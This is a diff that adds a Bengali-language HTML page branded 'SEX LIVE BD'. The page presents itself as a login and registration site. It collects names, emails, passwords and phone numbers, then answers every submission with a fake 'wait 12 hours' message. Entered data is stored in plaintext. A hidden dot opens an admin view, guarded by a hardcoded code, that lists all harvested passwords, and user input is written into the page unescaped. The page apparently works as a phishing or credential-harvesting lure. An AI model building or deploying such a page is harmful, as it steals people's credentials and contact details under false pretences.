@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SEX LIVE BD - লগইন ও রেজিস্ট্রেশন</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;600;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --primary-color: #ff4f81; /* একটু ভিন্ন রঙ দেওয়া হয়েছে নামের সাথে মিল রেখে */
+            --secondary-color: #ff0044;
+            --glass-bg: rgba(255, 255, 255, 0.98); 
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', 'Poppins', sans-serif; }
+
+        body {
+            background: linear-gradient(135deg, #ff4f81 0%, #7209b7 100%);
+            min-height: 100vh;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center; padding: 20px;
+        }
+
+        header {
+            margin-bottom: 25px; font-size: 42px; font-weight: 800;
+            color: #fff; text-shadow: 2px 2px 5px rgba(0,0,0,0.2);
+            letter-spacing: 1px;
+        }
+
+        .container {
+            background: var(--glass-bg);
+            padding: 35px; border-radius: 25px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            width: 100%; max-width: 420px;
+            text-align: center; border: 1px solid rgba(255,255,255,0.6);
+            position: relative;
+        }
+
+        h2 { color: #222; margin-bottom: 25px; font-weight: 700; }
+
+        .input-group { position: relative; margin-bottom: 15px; text-align: left; }
+        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--primary-color); }
+        .input-group input {
+            width: 100%; padding: 14px 14px 14px 45px;
+            border: 2px solid #eee; border-radius: 12px;
+            outline: none; transition: 0.3s; font-size: 15px;
+        }
+
+        .btn {
+            width: 100%; padding: 14px;
+            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+            border: none; border-radius: 12px;
+            color: white; font-size: 18px; font-weight: 600;
+            cursor: pointer; transition: 0.3s; margin-top: 10px;
+        }
+        .btn:hover { transform: scale(1.02); opacity: 0.9; }
+
+        .toggle-text { 
+            margin-top: 20px; 
+            font-size: 14px; 
+            color: #555; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+        }
+        .toggle-text b { color: #ff0044; cursor: pointer; text-decoration: underline; margin-right: 5px; }
+
+        .white-dot {
+            width: 4px; height: 4px;
+            background: #fff; 
+            border-radius: 50%;
+            cursor: pointer;
+            display: inline-block;
+            opacity: 0.5;
+        }
+
+        #success-view { display: none; padding: 20px; }
+        #success-view i { font-size: 80px; color: #28a745; margin-bottom: 20px; }
+        
+        #admin-view { display: none; text-align: left; width: 100%; }
+        .admin-header {
+            background: #333; color: white; padding: 15px;
+            border-radius: 12px; margin-bottom: 15px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .user-card {
+            background: #f1f1f1; padding: 12px; border-radius: 12px;
+            margin-bottom: 10px; border-left: 5px solid var(--primary-color); font-size: 14px;
+        }
+
+        .hidden { display: none !important; }
+        .animate { animation: fadeIn 0.4s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <header>SEX LIVE BD</header>
+
+    <div class="container animate">
+        
+        <!-- লগইন ফর্ম -->
+        <div id="login-form">
+            <h2>লগইন করুন</h2>
+            <div class="input-group">
+                <i class="fas fa-envelope"></i>
+                <input type="email" id="logEmail" placeholder="আপনার ইমেইল">
+            </div>
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="logPass" placeholder="পাসওয়ার্ড">
+            </div>
+            <button class="btn" onclick="handleLogin()">Login</button>
+            <div class="toggle-text">
+                অ্যাকাউন্ট নেই? <b onclick="switchTo('reg')">নতুন অ্যাকাউন্ট করুন</b>
+                <span class="white-dot" onclick="handleAdmin()"></span>
+            </div>
+        </div>
+
+        <!-- রেজিস্ট্রেশন ফর্ম -->
+        <div id="register-form" class="hidden">
+            <h2>নতুন অ্যাকাউন্ট</h2>
+            <div class="input-group"><i class="fas fa-user"></i><input type="text" id="regName" placeholder="আপনার নাম"></div>
+            <div class="input-group"><i class="fas fa-envelope"></i><input type="email" id="regEmail" placeholder="আসল ইমেইল"></div>
+            <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="regPass" placeholder="পাসওয়ার্ড"></div>
+            <div class="input-group"><i class="fas fa-phone"></i><input type="number" id="regPhone" placeholder="ফোন নাম্বার"></div>
+            <button class="btn" onclick="handleRegister()">Register</button>
+            <div class="toggle-text">
+                আগেই অ্যাকাউন্ট আছে? <b onclick="switchTo('login')">লগইন করুন</b>
+            </div>
+        </div>
+
+        <!-- ১২ ঘণ্টা অপেক্ষার পেজ -->
+        <div id="success-view">
+            <i class="fas fa-clock"></i>
+            <h3 style="color:#333;">অনুরোধ সফল হয়েছে। <br>দয়া করে <b>১২ ঘণ্টা</b> অপেক্ষা করুন।</h3>
+            <div style="display:flex; gap:10px; margin-top:25px;">
+                <button class="btn" style="background:#6c757d;" onclick="switchTo('login')">পিছনে যান</button>
+                <button class="btn" onclick="location.reload()">বন্ধ করুন</button>
+            </div>
+        </div>
+
+        <!-- অ্যাডমিন প্যানেল -->
+        <div id="admin-view">
+            <div class="admin-header">
+                <span><i class="fas fa-user-secret"></i> অ্যাডমিন ডাটা</span>
+                <i class="fas fa-times" onclick="location.reload()" style="cursor:pointer"></i>
+            </div>
+            <div id="user-list" style="max-height:350px; overflow-y:auto;"></div>
+            <button class="btn" style="background:#d9534f; margin-top:10px;" onclick="clearData()">সব মুছুন</button>
+        </div>
+
+    </div>
+
+    <div style="margin-top:25px; color:white; font-size:13px; opacity:0.8;">
+        © 2026 SEX LIVE BD | All Rights Reserved
+    </div>
+
+    <script>
+        const STORAGE_KEY = 'slbd_users_data';
+
+        function switchTo(view) {
+            document.getElementById('login-form').classList.add('hidden');
+            document.getElementById('register-form').classList.add('hidden');
+            document.getElementById('success-view').style.display = 'none';
+            document.getElementById('admin-view').style.display = 'none';
+
+            if(view === 'reg') {
+                document.getElementById('register-form').classList.remove('hidden');
+            } else if(view === 'login') {
+                document.getElementById('login-form').classList.remove('hidden');
+            }
+        }
+
+        function handleRegister() {
+            const name = document.getElementById('regName').value.trim();
+            const email = document.getElementById('regEmail').value.trim();
+            const pass = document.getElementById('regPass').value.trim();
+            const phone = document.getElementById('regPhone').value.trim();
+
+            if(!name || !email || !pass || !phone) {
+                alert("দয়া করে সব তথ্য দিন!");
+                return;
+            }
+
+            let users = JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
+            if(users.find(u => u.email === email)) {
+                alert("এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট খোলা হয়েছে!");
+                return;
+            }
+
+            users.push({name, email, pass, phone});
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
+            
+            switchTo('success');
+            document.getElementById('success-view').style.display = 'block';
+        }
+
+        function handleLogin() {
+            const email = document.getElementById('logEmail').value.trim();
+            const pass = document.getElementById('logPass').value.trim();
+
+            let users = JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
+            const userFound = users.find(u => u.email === email && u.pass === pass);
+
+            if(userFound) {
+                switchTo('success');
+                document.getElementById('success-view').style.display = 'block';
+            } else {
+                alert("অ্যাকাউন্ট পাওয়া যায়নি অথবা ভুল পাসওয়ার্ড!");
+            }
+        }
+
+        function handleAdmin() {
+            let p = prompt("অ্যাডমিন কোড:");
+            if(p === "462357") {
+                document.getElementById('login-form').classList.add('hidden');
+                document.getElementById('register-form').classList.add('hidden');
+                document.getElementById('admin-view').style.display = 'block';
+                loadAdminData();
+            } else if(p !== null) {
+                alert("ভুল কোড!");
+            }
+        }
+
+        function loadAdminData() {
+            const container = document.getElementById('user-list');
+            const users = JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
+            
+            if(users.length === 0) {
+                container.innerHTML = "<p style='text-align:center; color:#888;'>কোন ইউজার ডাটা নেই।</p>";
+                return;
+            }
+
+            container.innerHTML = "";
+            users.reverse().forEach(u => {
+                container.innerHTML += `
+                <div class="user-card animate">
+                    <p><b>নাম:</b> ${u.name}</p>
+                    <p><b>ইমেইল:</b> ${u.email}</p>
+                    <p><b>পাসওয়ার্ড:</b> ${u.pass}</p>
+                    <p><b>ফোন:</b> ${u.phone}</p>
+                </div>`;
+            });
+        }
+
+        function clearData() {
+            if(confirm("সব ডাটা মুছে ফেলবেন?")) {
+                localStorage.removeItem(STORAGE_KEY);
+                loadAdminData();
+            }
+        }
+    </script>
+
+</body>
+</html>
